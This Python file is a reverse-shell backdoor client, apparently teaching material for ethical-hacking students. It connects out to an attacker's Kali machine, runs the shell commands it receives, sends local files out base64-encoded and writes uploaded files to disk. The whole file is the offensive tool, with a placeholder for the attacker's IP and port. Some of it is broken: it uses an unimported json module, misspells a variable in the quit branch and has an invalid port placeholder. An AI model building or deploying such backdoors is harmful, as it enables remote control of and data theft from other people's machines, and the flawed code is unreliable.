import socket
import subprocess
import simplejson	#json -> simplejson
import os
import base64

class MySocket:										
	def __init__(self,ip,port):
		self.my_connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		#AF_INET is an address family used to designate the type of addresses that your socket can communicate with. After creating a socket,you have to specify its address family, and then you can only use addresses of that type with the socket.
		self.my_connection.connect((ip,port))
	def json_send(self,data):
		json_data=json.dumps(data)							#json doesn't support encoding(which is done below), hence used simplejson.
		self.my_connection.send(json_data.encode("utf-8"))	#sends back the output to kali			
		#need to enocde it since python3 sends it as byte(or string) even if it's json. 
	def json_receive(self):
		json_data=""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024).decode() #recv to recieve, 1024 = amount of data(in kb) which can be recieved.	
				#statement executes regardless of geting error or not.
				return simplejson.loads(json_data)					
			except ValueError:
				continue
			'''
			Hence, if we get a ValueError, it will keep on running the loop and our json data will continue getting added to the variable 'json_data'.
			Once we don't get the error(when the complete data has been received and stored in the variable) it will just return the data and the loop will stop.
			'''	
	def command_execution(self,command):
		return subprocess.check_output(command,shell=True)	
		#check_output returns the output of the command specified as a parameter,shell=True is used when the command is not in the form of a list(which is the usual case)but rather is in a form of a string.
	
	def execute_cd_command(self,directory):
		os.chdir(directory)								#changes current directory							
		return "Cd to " + directory
	def get_file_contents(self,path):
		with open(path,"rb") as my_file:				#chose rb(read binary) instead of just r since it can be anything (eg:image)						
			return base64.b64encode(my_file.read())	
	def save_file(self,path,content):						
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))				
			return "download done"						#"upload done" actually here									
	def start_socket(self):
		while True:
			command=self.json_receive()
			try:	
				if commnad[0] == "quit":
					self.my_connection.close()
					exit()
				elif command[0] == "cd" and len(command)>1:
					command_output=self.execute_cd_command(command[1])
				elif command[0] == "download":
					command_output=self.get_file_contents(command[1]) 
				elif command[0] == "upload":
					command_output=self.save_file(command[1],command[2]) 	#[0]=upload, [1]=file name, [2]=file's content		
				else:
					command_output=self.command_execution(command)
			except Exception:								
				command_output="error!"
			self.json_send(command_output)				
		self.my_connection.close()

my_socket_object = MySocket("<kaliIP>",<port>) ### **** INSERT YOURS *** ###
my_socket_object.start_socket()